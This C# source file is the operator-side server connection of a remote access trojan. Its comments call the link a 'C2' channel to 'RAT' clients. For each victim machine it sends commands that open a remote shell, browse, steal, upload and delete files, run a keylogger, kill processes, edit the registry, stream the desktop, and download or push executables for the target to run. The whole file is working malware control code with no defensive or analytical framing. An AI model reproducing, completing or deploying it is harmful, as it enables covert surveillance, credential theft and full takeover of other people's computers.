using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using RWORM.GUI.Models;

namespace RWORM.GUI.Services
{
    /// <summary>
    /// Manages the GUI→Server connection.
    /// All C2 commands are prefixed with  targetGuid + '\x00' + payload
    /// so the server can route them to the correct RAT client.
    /// Incoming packets from the server are prefixed with guid + '\x00' + data.
    /// </summary>
    public class ServerConnection
    {
        // ── Transport ─────────────────────────────────────────────────────────
        private TcpClient?     _client;
        private NetworkStream? _stream;
        private volatile bool  _connected;
        private readonly object _writeLock = new();
        private readonly List<byte> _buf    = new();

        private readonly string _host;
        private readonly int    _port;

        // ── Routing ───────────────────────────────────────────────────────────
        // Per-guid callbacks for typed responses.
        // Key = guid, Value = dict of packetType -> handler
        private readonly Dictionary<string, Dictionary<byte, Action<byte[]>>> _handlers = new();
        private readonly object _handlersLock = new();

        private List<ClientModel> _cachedClients = new();

        public event EventHandler<string>? OutputReceived;
        public event EventHandler<bool>?   ConnectionChanged;

        public bool Connected => _connected;

        public ServerConnection(string host, int port)
        {
            _host = host;
            _port = port;
        }

        // ── Connect / Disconnect ──────────────────────────────────────────────
        public async Task<bool> ConnectAsync()
        {
            try
            {
                _client = new TcpClient();
                await _client.ConnectAsync(_host, _port);
                _stream    = _client.GetStream();
                _connected = true;
                _buf.Clear();
                ConnectionChanged?.Invoke(this, true);
                _ = Task.Run(ReceiveLoop);
                return true;
            }
            catch { _connected = false; ConnectionChanged?.Invoke(this, false); return false; }
        }

        public void Disconnect()
        {
            _connected = false;
            _stream?.Close();
            _client?.Close();
            ConnectionChanged?.Invoke(this, false);
        }

        // ── Client list ───────────────────────────────────────────────────────
        public async Task<List<ClientModel>> GetClientsAsync()
        {
            if (!_connected) return new List<ClientModel>();
            await RawSendAsync(Build(0x10, "GET_CLIENTS"));
            await Task.Delay(600);
            return _cachedClients.ToList();
        }

        // ── Shell helpers ─────────────────────────────────────────────────────
        public void RegisterShellHandler(string guid, Action<string> handler)
            => RegisterHandler(guid, 0x22, p => handler(Encoding.UTF8.GetString(p)));

        public void UnregisterShellHandler(string guid) => UnregisterHandler(guid, 0x22);

        public Task OpenShellAsync(string guid)    => GuiSend(0x20, guid, Array.Empty<byte>());
        public Task SendShellInputAsync(string guid, string cmd) => GuiSend(0x21, guid, Encoding.UTF8.GetBytes(cmd));
        public Task CloseShellAsync(string guid)   => GuiSend(0x23, guid, Array.Empty<byte>());

        // ── File Manager ─────────────────────────────────────────────────────
        public Task RequestFileListAsync(string guid, string path, Action<byte[]> cb)
        {
            RegisterHandler(guid, 0x31, cb);
            return GuiSend(0x30, guid, Encoding.UTF8.GetBytes(path));
        }

        public Task DownloadFileAsync(string guid, string path, Action<byte[]> cb)
        {
            RegisterHandler(guid, 0x33, cb);
            return GuiSend(0x32, guid, Encoding.UTF8.GetBytes(path));
        }

        public Task UploadFileAsync(string guid, string remotePath, byte[] data)
        {
            var pathBytes = Encoding.UTF8.GetBytes(remotePath);
            var payload   = new byte[pathBytes.Length + 1 + data.Length];
            Array.Copy(pathBytes, 0, payload, 0, pathBytes.Length);
            payload[pathBytes.Length] = 0;
            Array.Copy(data, 0, payload, pathBytes.Length + 1, data.Length);
            return GuiSend(0x34, guid, payload);
        }

        public Task DeleteRemotePathAsync(string guid, string path)
            => GuiSend(0x35, guid, Encoding.UTF8.GetBytes(path));

        public Task MakeDirAsync(string guid, string path)
            => GuiSend(0x36, guid, Encoding.UTF8.GetBytes(path));

        // ── Keylogger ─────────────────────────────────────────────────────────
        public void RegisterKeylogHandler(string guid, Action<string> cb)
            => RegisterHandler(guid, 0x42, p => cb(Encoding.UTF8.GetString(p)));
        public void UnregisterKeylogHandler(string guid) => UnregisterHandler(guid, 0x42);
        public Task StartKeylogger(string guid, bool online)
            => GuiSend(0x40, guid, Encoding.UTF8.GetBytes(online ? "online" : "offline"));
        public Task StopKeylogger(string guid)  => GuiSend(0x41, guid, Array.Empty<byte>());
        public Task DumpOfflineLog(string guid) => GuiSend(0x43, guid, Array.Empty<byte>());

        // ── Process Manager ──────────────────────────────────────────────────
        public Task RequestProcessList(string guid, Action<byte[]> cb)
        {
            RegisterHandler(guid, 0x51, cb);
            return GuiSend(0x50, guid, Array.Empty<byte>());
        }
        public Task KillProcess(string guid, int pid)
            => GuiSend(0x52, guid, Encoding.UTF8.GetBytes(pid.ToString()));

        // ── Registry ─────────────────────────────────────────────────────────
        public Task RequestRegList(string guid, string fullPath, Action<byte[]> cb)
        {
            RegisterHandler(guid, 0x61, cb);
            return GuiSend(0x60, guid, Encoding.UTF8.GetBytes(fullPath));
        }
        public Task WriteRegValue(string guid, string path, string name, string kind, string data)
            => GuiSend(0x64, guid,
                Encoding.UTF8.GetBytes($"{path}\x00{name}\x00{kind}\x00{data}"));
        public Task DeleteRegValue(string guid, string path, string name)
            => GuiSend(0x65, guid, Encoding.UTF8.GetBytes($"{path}\x00{name}"));

        // ── Loader ────────────────────────────────────────────────────────────
        public Task LoaderExec(string guid, string url, Action<byte[]>? cb = null)
        {
            if (cb != null) RegisterHandler(guid, 0x71, cb);
            return GuiSend(0x70, guid, Encoding.UTF8.GetBytes(url));
        }

        public Task LoaderExecFile(string guid, byte[] fileBytes, Action<byte[]>? cb = null) => RunFileTaskAsync(guid, fileBytes, cb);

        // ── Remote Desktop ────────────────────────────────────────────────────
        public void RegisterRDHandler(string guid, Action<byte[]> cb)
            => RegisterHandler(guid, 0x81, cb);
        public void UnregisterRDHandler(string guid) => UnregisterHandler(guid, 0x81);
        public Task StartRemoteDesktop(string guid) => GuiSend(0x80, guid, Array.Empty<byte>());
        public Task StopRemoteDesktop(string guid)  => GuiSend(0x83, guid, Array.Empty<byte>());

        // ── Client control ────────────────────────────────────────────────────
        public Task ClientClose(string guid)     => GuiSend(0xA0, guid, Array.Empty<byte>());
        public Task ClientUninstall(string guid) => GuiSend(0xA1, guid, Array.Empty<byte>());
        public Task ClientUpdate(string guid, string url)
            => GuiSend(0xA2, guid, Encoding.UTF8.GetBytes(url));
        public Task WatchdogStop(string guid)
            => GuiSend(0xA5, guid, Array.Empty<byte>());
        public Task WatchdogStart(string guid)
            => GuiSend(0xA6, guid, Array.Empty<byte>());

        // ── Tasks ─────────────────────────────────────────────────────────────
        /// Send raw EXE bytes → client writes to temp → exec (0xB0).
        public Task RunFileTaskAsync(string guid, byte[] exeBytes, Action<byte[]>? cb = null)
        {
            if (cb != null) RegisterHandler(guid, 0xB1, cb);
            return GuiSend(0xB0, guid, exeBytes);
        }

        /// Send URL for client to download + exec (0x70, reuses Loader).
        public Task RunUrlTaskAsync(string guid, string url, Action<byte[]>? cb = null)
        {
            if (cb != null) RegisterHandler(guid, 0x71, cb);
            return GuiSend(0x70, guid, Encoding.UTF8.GetBytes(url));
        }

        // ── One-shot shell command (legacy) ───────────────────────────────────
        public async Task<string> SendCommandAsync(string guid, string command)
        {
            if (!_connected) return "Not connected";
            await GuiSend(0x03, guid, Encoding.UTF8.GetBytes(command));
            return "Sent";
        }

        // ── Internal routing helpers ──────────────────────────────────────────
        private Task GuiSend(byte type, string guid, byte[] rest)
        {
            // Build: [type][guid\x00rest]
            var guidBytes = Encoding.UTF8.GetBytes(guid + '\x00');
            var payload   = new byte[guidBytes.Length + rest.Length];
            Array.Copy(guidBytes, 0, payload, 0, guidBytes.Length);
            Array.Copy(rest, 0, payload, guidBytes.Length, rest.Length);
            return RawSendAsync(Build(type, payload));
        }

        private void RegisterHandler(string guid, byte type, Action<byte[]> cb)
        {
            lock (_handlersLock)
            {
                if (!_handlers.TryGetValue(guid, out var d))
                    _handlers[guid] = d = new Dictionary<byte, Action<byte[]>>();
                d[type] = cb;
            }
        }

        private void UnregisterHandler(string guid, byte type)
        {
            lock (_handlersLock)
            {
                if (_handlers.TryGetValue(guid, out var d)) d.Remove(type);
            }
        }

        // ── Receive loop ──────────────────────────────────────────────────────
        private async void ReceiveLoop()
        {
            var chunk = new byte[131072];
            while (_connected)
            {
                try
                {
                    if (_stream == null || !_stream.CanRead) break;
                    int n = await _stream.ReadAsync(chunk, 0, chunk.Length);
                    if (n == 0) break;
                    lock (_buf) for (int i = 0; i < n; i++) _buf.Add(chunk[i]);
                    DrainPackets();
                }
                catch { break; }
            }
            _connected = false;
            ConnectionChanged?.Invoke(this, false);
        }

        private void DrainPackets()
        {
            while (true)
            {
                byte[] raw;
                lock (_buf) raw = _buf.ToArray();
                if (raw.Length < 25) return;
                int pLen = BitConverter.ToInt32(raw, 0);
                byte pType = raw[4];
                if (pLen < 0 || pLen > 100 * 1024 * 1024) { lock (_buf) _buf.Clear(); return; }
                int total = 9 + pLen + 16;
                if (raw.Length < total) return;

                var hdr = new byte[9]; Array.Copy(raw, 0, hdr, 0, 9);
                var pl  = new byte[pLen]; Array.Copy(raw, 9, pl, 0, pLen);
                var mac = new byte[16]; Array.Copy(raw, 9 + pLen, mac, 0, 16);
                using (var sha = SHA256.Create())
                {
                    var c = new byte[9 + pLen];
                    Array.Copy(hdr, 0, c, 0, 9); Array.Copy(pl, 0, c, 9, pLen);
                    var h = sha.ComputeHash(c);
                    bool ok = true;
                    for (int i = 0; i < 16; i++) if (h[i] != mac[i]) { ok = false; break; }
                    if (!ok) { lock (_buf) _buf.Clear(); return; }
                }
                lock (_buf) _buf.RemoveRange(0, total);
                DispatchIncoming(pType, pl);
            }
        }

        private void DispatchIncoming(byte type, byte[] payload)
        {
            switch (type)
            {
                case 0x04:  // legacy SHELL_OUTPUT
                    OutputReceived?.Invoke(this, Encoding.UTF8.GetString(payload));
                    return;

                case 0x11:  // GET_CLIENTS response
                    try
                    {
                        var list = JsonSerializer.Deserialize<List<ClientModel>>(
                            Encoding.UTF8.GetString(payload),
                            new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
                        if (list != null) _cachedClients = list;
                    }
                    catch { }
                    return;
            }

            // All other packets are prefixed with guid\x00
            int sep = Array.IndexOf(payload, (byte)0);
            if (sep <= 0) return;

            var guid    = Encoding.UTF8.GetString(payload, 0, sep);
            var rest    = new byte[payload.Length - sep - 1];
            Array.Copy(payload, sep + 1, rest, 0, rest.Length);

            Dictionary<byte, Action<byte[]>>? handlers = null;
            lock (_handlersLock) _handlers.TryGetValue(guid, out handlers);

            if (handlers != null && handlers.TryGetValue(type, out var handler))
            {
                try { handler(rest); } catch { }
            }
            else
            {
                // No handler: only forward printable text. Binary payloads
                // (e.g. RD frames still in flight after a window closed) used
                // to be dumped into the terminal as UTF-8 garbage — at 10+ fps
                // that floods the UI with megabytes of text and freezes it.
                if (LooksLikeText(rest))
                {
                    var shortGuid = guid.Length > 8 ? guid.Substring(0, 8) : guid;
                    var text = Encoding.UTF8.GetString(rest).TrimEnd();
                    OutputReceived?.Invoke(this, "[" + shortGuid + "][" + type.ToString("X2") + "] " + text);
                }
            }
        }

        /// <summary>True when the payload is short and mostly printable text.</summary>
        private static bool LooksLikeText(byte[] data)
        {
            int n = Math.Min(data.Length, 512);
            if (n == 0) return true;
            int printable = 0;
            for (int i = 0; i < n; i++)
            {
                byte b = data[i];
                if (b == 9 || b == 10 || b == 13 || (b >= 0x20 && b < 0x7F)) printable++;
            }
            return printable >= n * 3 / 4;
        }

        // ── Packet builder ────────────────────────────────────────────────────
        private static byte[] Build(byte type, string text) => Build(type, Encoding.UTF8.GetBytes(text));
        private static byte[] Build(byte type, byte[] pl)
        {
            var hdr = new byte[9];
            BitConverter.GetBytes(pl.Length).CopyTo(hdr, 0);
            hdr[4] = type;
            byte[] mac;
            using (var sha = SHA256.Create())
            {
                var c = new byte[9 + pl.Length];
                Array.Copy(hdr, 0, c, 0, 9); Array.Copy(pl, 0, c, 9, pl.Length);
                mac = new byte[16]; Array.Copy(sha.ComputeHash(c), 0, mac, 0, 16);
            }
            var r = new byte[9 + pl.Length + 16];
            Array.Copy(hdr, 0, r, 0, 9); Array.Copy(pl, 0, r, 9, pl.Length); Array.Copy(mac, 0, r, 9 + pl.Length, 16);
            return r;
        }

        private async Task RawSendAsync(byte[] data)
        {
            if (_stream == null || !_connected) return;
            try { lock (_writeLock) { _stream.Write(data, 0, data.Length); _stream.Flush(); } }
            catch { _connected = false; }
        }
    }
}
